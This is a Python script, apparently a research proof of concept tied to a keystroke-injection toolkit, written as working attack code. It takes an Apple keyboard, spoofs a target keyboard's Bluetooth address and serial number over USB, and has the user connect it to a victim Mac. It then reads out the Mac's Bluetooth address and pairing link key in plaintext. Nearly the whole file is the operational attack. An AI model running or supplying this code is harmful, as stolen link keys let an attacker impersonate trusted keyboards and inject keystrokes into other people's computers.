#!/usr/bin/env python3

import argparse
import binascii
import re
import time
import usb.core
from injector.helpers import log, assert_address

class USBKeyboard:

  def __init__(self):
    self.connect()

  def connect(self):
    self.dev = usb.core.find(idVendor=0x05ac)
    for x in range(8):
      if self.dev.is_kernel_driver_active(x):
        self.dev.detach_kernel_driver(x)
    self.dev.set_configuration(1)

  def get_descriptor(self, id, max_len=0x100):
    return bytes(self.dev.ctrl_transfer(0x80, 0x06, id, 0x0000, max_len))

  def set_descriptor(self, id, value):
    self.dev.ctrl_transfer(0x00, 0x06, id, 0x0000, value)

  def get_string_descriptor(self, index):
    raw = self.get_descriptor(0x0300 | index)
    ascii = raw[2:][::2].decode()
    return ascii

  def set_string_descriptor(self, index, value, pad=0):
    value = value.encode()
    if pad > len(value):
      value += b"\x00"*(pad - len(value))
    desc = b""
    for x in range(len(value)):
      desc += bytes([value[x], 0])
    desc = b"\x03" + desc
    desc = bytes([len(desc)+1+100]) + desc
    if pad > len(desc):
      desc += b"\x00"*(pad-len(desc))
    self.set_descriptor(0x0300 | index, desc)

  def get_hid_report(self, report_id):
    try:
      return bytes(self.dev.ctrl_transfer(0xa1, 0x01, 0x0300 | report_id, 0x0000, 0x1000))
    except:
      return None

  def set_hid_report(self, report_id, raw):
    return self.dev.ctrl_transfer(0x21, 0x09, 0x0300 | report_id, 0x0000, raw)


if __name__ == "__main__":

  # parse command line arguments
  parser = argparse.ArgumentParser("read-link-key-from-mac.py")
  parser.add_argument("-a", "--keyboard_address", required=True)
  parser.add_argument("-s", "--keyboard_serial", required=True)
  args = parser.parse_args()

  # do a basic sanity check of the provided arguments
  assert_address(args.keyboard_address)
  assert(re.match(r"^[A-Z0-9]{17}$", args.keyboard_serial))
  bt_addr = args.keyboard_address
  serial = args.keyboard_serial

  # instruct the user to connect the donor keyboard
  log.notice("Turn on the donor keyboard and plug it into this computer ")
  while usb.core.find(idVendor=0x05ac) is None:
    time.sleep(0.1)

  # update HID-report 0x34 to include the target Bluetooth address
  kbd = USBKeyboard()
  report = kbd.get_hid_report(0x34)
  current_bt_addr = ":".join(["%02X" % c for c in report[4:10]])
  log.info("changing Bluetooth address from %s to %s" % (current_bt_addr, bt_addr))
  report = report[:4] + binascii.unhexlify(bt_addr.replace(":", "")) + report[10:]
  kbd.set_hid_report(0x34, report)

  # update the serial-number string descriptor to match the target
  current_serial = kbd.get_string_descriptor(3).strip()
  log.info("serial number: %s -> %s" % (current_serial, serial))
  kbd.set_string_descriptor(3, serial, 32)

  # instruct the user to connect the keyboard to the Mac
  log.notice("Unplug the donor keyboard and plug it into the Mac.")
  while usb.core.find(idVendor=0x05ac) is not None:
    time.sleep(0.1)
  log.info("keyboard was unplugged")

  # instruct the user to return the keyboard to this computer
  log.notice("Wait a few seconds, then plug it back into this computer.")
  while usb.core.find(idVendor=0x05ac) is None:
    time.sleep(0.1)
  kbd.connect()
  log.info("keyboard has returned")

  # read and print the target link key and Bluetooth address
  report = kbd.get_hid_report(0x35)
  mac_bt_addr = ":".join("%02x" % c for c in report[3:9])
  bt_link_key = binascii.hexlify(report[9:25][::-1]).decode()
  log.info("Mac BT Address - %s" % mac_bt_addr)
  log.info("BT Link-Key    - %s" % bt_link_key)
